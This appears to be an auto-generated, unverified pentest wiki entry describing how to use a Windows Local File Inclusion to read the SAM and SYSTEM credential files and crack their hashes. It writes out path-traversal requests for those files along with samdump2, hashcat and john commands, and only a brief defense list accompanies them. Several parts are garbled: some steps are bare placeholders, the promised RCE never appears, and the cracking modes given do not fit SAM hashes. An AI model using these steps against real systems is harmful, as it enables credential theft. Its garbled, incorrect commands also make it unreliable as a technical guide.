---
id: 8b712953-5957-4fa9-9c01-af737e58f9d8
name: Windows LFI to RCE via Credentials Files
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.678261+00:00'
updated_at: '2023-04-10T20:22:20.820185+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[File Inclusion]]'
- '[[LFI to RCE via credentials files]]'
- '[[Windows version]]'
commands:
- '[[Cracking password using hashcat]]'
- '[[Cracking password using john]]'
- '[[Extract hashes from SAM and SYSTEM files using samdump2]]'
---

# Windows LFI to RCE via Credentials Files

## Summary

This procedure involves exploiting a Local File Inclusion vulnerability on a Windows system to gain access to sensitive files such as the SAM and SYSTEM files. These files contain password hashes and other sensitive information that can be used to escalate privileges or gain access to other systems

## Description

# Description

This procedure involves exploiting a Local File Inclusion vulnerability on a Windows system to gain access to sensitive files such as the SAM and SYSTEM files. These files contain password hashes and other sensitive information that can be used to escalate privileges or gain access to other systems. The attacker can then use the extracted password hashes to crack them and gain access to the Windows system.

The technical explanation is that the attacker sends a specially crafted HTTP request to the vulnerable application, which allows them to include arbitrary files from the local file system. By including the SAM and SYSTEM files, the attacker can extract password hashes and use them to crack passwords and gain access to the system.

The business value of this attack is that it allows an attacker to gain access to sensitive information and escalate privileges, potentially leading to a full compromise of the system or network.

## Requirements

1. Access to a vulnerable application that allows Local File Inclusion

1. Access to the Windows system's SAM and SYSTEM files

1. Tools such as samdump2, hashcat, or john to extract and crack password hashes

## Defense

1. Implement input validation on the vulnerable application to prevent Local File Inclusion vulnerabilities

1. Restrict access to sensitive files such as the SAM and SYSTEM files

1. Implement strong password policies to prevent password cracking attacks

## Objectives

1. Extract password hashes from the SAM and SYSTEM files on a Windows system

1. Crack the extracted password hashes to gain access to the system

1. Escalate privileges and gain access to other systems on the network

# Instructions

1. sam

**Code**: [[sam]]

> This command extracts the SAM file from the Windows system.

2. system

**Code**: [[system]]

> This command extracts the SYSTEM file from the Windows system.

3. http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system

**Code**: [[http://example.com/index.php?page=../../../../../.]]

> This HTTP request includes the SAM and SYSTEM files from the Windows system.

4. samdump2 SYSTEM SAM &gt; hashes.txt

**Code**: [[samdump2 SYSTEM SAM &gt; hashes.txt]]

> This command extracts password hashes from the SAM and SYSTEM files and saves them to a file named hashes.txt.

**Command** ([[Extract hashes from SAM and SYSTEM files using samdump2]]):

```bash
samdump2 SYSTEM SAM &gt; hashes.txt
```

5. hashcat/john

**Code**: [[hashcat/john]]

> These tools can be used to crack the extracted password hashes and gain access to the Windows system.

**Command** ([[Cracking password using hashcat]]):

```bash
$ hashcat -m 1400 hash.txt rockyou.txt
```

**Command** ([[Cracking password using john]]):

```bash
$ john --format=sha256 --wordlist=rockyou.txt hash.txt
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Cracking password using hashcat]]
- [[Cracking password using john]]
- [[Extract hashes from SAM and SYSTEM files using samdump2]]

## Tags

- [[File Inclusion]]
- [[LFI to RCE via credentials files]]
- [[Windows version]]
